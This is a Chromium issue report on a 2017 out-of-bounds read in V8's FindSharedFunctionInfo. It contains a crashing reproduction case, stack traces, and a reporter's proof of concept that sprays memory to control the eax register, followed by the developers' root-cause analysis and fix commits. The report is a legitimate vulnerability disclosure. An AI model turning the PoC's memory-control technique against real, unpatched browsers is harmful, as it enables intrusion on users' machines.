# Security: Out of bound read in FindSharedFunctionInfo (V8)

| Field | Value |
|-------|-------|
| **Issue ID** | [40087462](https://issues.chromium.org/issues/40087462) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cw...@gmail.com |
| **Assignee** | jo...@chromium.org |
| **Created** | 2017-04-26 |
| **Bounty** | $3,000.00 |

## Description

**VERSION**  

Chrome Version: stable (v8 5.8.283.32)

**REPRODUCTION CASE**

```
this.__defineGetter__("x", (a = (function f() { return; (function() {}); })()) => { });  
x;  

```
```
$ ../../..//v8/out/ia32.debug/d8 --allow-natives-syntax --expose-gc ./c25784.js  
  
  
#  
# Fatal error in ../src/objects.cc, line 13157  
# Check failed: fun->function_literal_id() < shared_function_infos()->length() (4 vs. 4).  
#  
  
==== C stack trace ===============================  
  
    ../../..//v8/out/ia32.debug/d8(v8::base::debug::StackTrace::StackTrace()+0x31) [0x8bb4ff1]  
    ../../..//v8/out/ia32.debug/d8(V8_Fatal+0xbd) [0x8bb01ad]  
    ../../..//v8/out/ia32.debug/d8(v8::internal::Script::FindSharedFunctionInfo(v8::internal::Isolate\*, v8::internal::FunctionLiteral $onst\*)+0x13c) [0x94032cc]  
    ../../..//v8/out/ia32.debug/d8(v8::internal::Compiler::GetSharedFunctionInfo(v8::internal::FunctionLiteral\*, v8::internal::Handle<$8::internal::Script>, v8::internal::CompilationInfo\*)+0x76) [0x8f14256]  
    ../../..//v8/out/ia32.debug/d8() [0x8f19ebc]  
    ../../..//v8/out/ia32.debug/d8() [0x8f19895]  
    ../../..//v8/out/ia32.debug/d8() [0x8f0ec04]  
    ../../..//v8/out/ia32.debug/d8() [0x8f0c305]  

```

MaybeHandle<SharedFunctionInfo> Script::FindSharedFunctionInfo(  

Isolate\* isolate, const FunctionLiteral\* fun) {  

..  

DCHECK\_LT(fun->function\_literal\_id(), shared\_function\_infos()->length());  

Object\* shared = shared\_function\_infos()->get(fun->function\_literal\_id()); // <-- OOB  

..  

}

## Attachments

- [poc715582.html](attachments/poc715582.html) (text/plain, 1.6 KB)

## Timeline

### cw...@gmail.com (2017-04-26)

and this is a PoC to control the eax register with a dumb memory spray.

tested in Ubuntu 14.04.3 64bit, v8 32bit compile.

```test.js
this.__defineGetter__("x", (a0 = (function () {})(),
      a1 = (function () {})(),
      a2 = (function () {})(),
      a3 = (function () {})(),
      a4 = (function () {})(),
      a5 = (function () {})(),
      a6 = (function () {})(),
      a7 = (function () {})(),
      a8 = (function () {})(),
      a9 = (function () {})(),
      a10 = (function () {})(),
      a11 = (function () {})(),
      a12 = (function () {})(),
      a13 = (function () {})(),
      a14 = (function () {})(),
      a15 = (function () {})(),
      a16 = (function () {})(),
      a17 = (function () {})(),
      a18 = (function () {})(),
      a19 = (function () {})(),
      a20 = (function () {})(),
      a21 = (function () {})(),
      a22 = (function () {})(),
      a23 = (function () {})(),
      a24 = (function () {})(),
      a25 = (function () {})(),
      a26 = (function () {})(),
      a27 = (function () {})(),
      a28 = (function () {})(),
      a29 = (function () {})(),
      a30 = (function () {})(),
      a31 = (function () {})(),
      a32 = (function () {})(),
      a33 = (function () {})(),
      a34 = (function () {})(),
      a35 = (function () {})(), // the number of arguments control the array index (it increases)
      a = (function f() { return; (function() {}); })()) => { },
    a1 = (function() {
      let arr = [];
      for(var i = 0; i < 23; i++)
        //arr.push(new Uint32Array(10000).fill(0x41414141));
        arr.push(0x20202020); // spray memory to 0x20202020 << 1 == 0x40404040
    })()
    );
x;
```

$ gdb -q --args ../../..//v8/out/ia32.release/d8 --allow-natives-syntax --expose-gc ./test.js
...
Program received signal SIGSEGV, Segmentation fault.
0x083ef1f7 in v8::internal::Script::FindSharedFunctionInfo(v8::internal::Isolate*, v8::internal::FunctionLiteral const*) ()
(gdb) x/i $pc
=> 0x83ef1f7 <_ZN2v88internal6Script22FindSharedFunctionInfoEPNS0_7IsolateEPKNS0_15FunctionLiteralE+39>:
    mov    edi,DWORD PTR [eax+0x3]
(gdb) i r eax
eax            0x40404040       1077952576

### cl...@chromium.org (2017-04-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6602967760502784

### el...@chromium.org (2017-04-26)

Crashes in Canary; crash/6a7c7ece80000000

0x00007ffacf042e1e	(chrome_child.dll -objects.cc:13386 )	v8::internal::Script::FindSharedFunctionInfo(v8::internal::Isolate *,v8::internal::FunctionLiteral const *)
0x00007ffacf15b0ff	(chrome_child.dll -compiler.cc:1787 )	v8::internal::Compiler::GetSharedFunctionInfo(v8::internal::FunctionLiteral *,v8::internal::Handle<v8::internal::Script>,v8::internal::CompilationInfo *)
0x00007ffacefd2989	(chrome_child.dll -compiler.cc:559 )	v8::internal::`anonymous namespace'::CompileUnoptimizedInnerFunctions
0x00007ffacefd282f	(chrome_child.dll -compiler.cc:647 )	v8::internal::`anonymous namespace'::CompileUnoptimizedCode
0x00007ffacf05032b	(chrome_child.dll -compiler.cc:702 )	v8::internal::`anonymous namespace'::GetUnoptimizedCode
0x00007ffacf05071f	(chrome_child.dll -compiler.cc:1097 )	v8::internal::`anonymous namespace'::GetLazyCode
0x00007ffacf0504c9	(chrome_child.dll -compiler.cc:1252 )	v8::internal::Compiler::Compile(v8::internal::Handle<v8::internal::JSFunction>,v8::internal::Compiler::ClearExceptionFlag)
0x00007ffacf051869	(chrome_child.dll -runtime-compiler.cc:22 )	v8::internal::Runtime_CompileLazy(int,v8::internal::Object * *,v8::internal::Isolate *)

[Monorail components: Blink>JavaScript]

### ha...@chromium.org (2017-04-26)

[Empty comment from Monorail migration]

[Monorail components: -Blink>JavaScript Blink>JavaScript>Compiler]

### pa...@chromium.org (2017-04-26)

Probably best to get the fix backported to 58, right?

### jo...@chromium.org (2017-04-26)

[Empty comment from Monorail migration]

### jo...@chromium.org (2017-04-26)

what happens is that almost all ast traversal visitors abort statement lists after an unconditional jump is encountered, except for the ast renumbering visitor. That visitor, however, is also used to collect functions that are referenced from to-be-compiled functions, and so it collects an unreachable function (that was previously not assigned a correct id, because we figured it wouldn't get compiled)

### jo...@chromium.org (2017-04-26)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-04-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/4e78b5a70c6443e3829b0bef10fd731062e27aa3

commit 4e78b5a70c6443e3829b0bef10fd731062e27aa3
Author: Jochen Eisinger <jochen@chromium.org>
Date: Thu Apr 27 10:47:37 2017

Add missing early-bailouts in ast traversal visitors

Instructions after an unconditional jump can be omitted.

BUG=chromium:715582
R=bradnelson@chromium.org,verwaest@chromium.org
TBR=bradnelson@chromium.org

Change-Id: Ie4f4041ed836f328955a0ff396e2dfd6adc01513
Reviewed-on: https://chromium-review.googlesource.com/487983
Commit-Queue: Jochen Eisinger <jochen@chromium.org>
Reviewed-by: Toon Verwaest <verwaest@chromium.org>
Cr-Commit-Position: refs/heads/master@{#44923}
[modify] https://crrev.com/4e78b5a70c6443e3829b0bef10fd731062e27aa3/src/asmjs/asm-wasm-builder.cc
[modify] https://crrev.com/4e78b5a70c6443e3829b0bef10fd731062e27aa3/src/ast/ast-numbering.cc
[add] https://crrev.com/4e78b5a70c6443e3829b0bef10fd731062e27aa3/test/mjsunit/regress/regress-715582.js


### jo...@chromium.org (2017-04-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-29)

Your change meets the bar and is auto-approved for M59. Please go ahead and merge the CL to branch 3071 manually. Please contact milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), gkihumba@(ChromeOS), Abdul Syed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-04-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/fbf974e2af0f62b075e62701581099211f83adb6

commit fbf974e2af0f62b075e62701581099211f83adb6
Author: Jochen Eisinger <jochen@chromium.org>
Date: Sat Apr 29 19:12:17 2017

Merged: Add missing early-bailouts in ast traversal visitors

Revision: 4e78b5a70c6443e3829b0bef10fd731062e27aa3

BUG=chromium:715582
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
TBR=hablich@chromium.org

Change-Id: I0a148102c58dc2233966a90ba9f6d140879d55f0
Reviewed-on: https://chromium-review.googlesource.com/491026
Reviewed-by: Jochen Eisinger <jochen@chromium.org>
Commit-Queue: Jochen Eisinger <jochen@chromium.org>
Cr-Commit-Position: refs/branch-heads/5.9@{#33}
Cr-Branched-From: fe9bb7e6e251159852770160cfb21dad3cf03523-refs/heads/5.9.211@{#1}
Cr-Branched-From: 70ad23791a21c0dd7ecef8d4d8dd30ff6fc291f6-refs/heads/master@{#44591}
[modify] https://crrev.com/fbf974e2af0f62b075e62701581099211f83adb6/src/asmjs/asm-wasm-builder.cc
[modify] https://crrev.com/fbf974e2af0f62b075e62701581099211f83adb6/src/ast/ast-numbering.cc
[add] https://crrev.com/fbf974e2af0f62b075e62701581099211f83adb6/test/mjsunit/regress/regress-715582.js


### jo...@chromium.org (2017-04-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-05-01)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-05-01)

[Empty comment from Monorail migration]

### jo...@chromium.org (2017-05-02)

Danno, ok to merge to stable (5.8)?

### jo...@chromium.org (2017-05-02)

using the chromium merge label to get some more eyes on this

### go...@chromium.org (2017-05-02)

+ awhalley@ for M58 merge review (Note: This change is not yet baked in Beta).

### aw...@chromium.org (2017-05-02)

Too late for the current M58 stable update, but worth keeping an eye on if there's another.

### am...@chromium.org (2017-05-02)

If it's not critical enough to warrant a respin for, I don't think we should take it - extra risk is not necessary at this time.  The fix can ship with M59.

### aw...@chromium.org (2017-05-02)

Sounds good.

### aw...@chromium.org (2017-05-05)

[Empty comment from Monorail migration]

### aw...@google.com (2017-05-05)

Nice one!  The VRP panel decided to award $3,000 for this bug!  Thanks as ever.

### aw...@chromium.org (2017-05-05)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-05-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-05-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-08-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/715582?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-07)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/chrome-blintz-user-guide

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087462)*
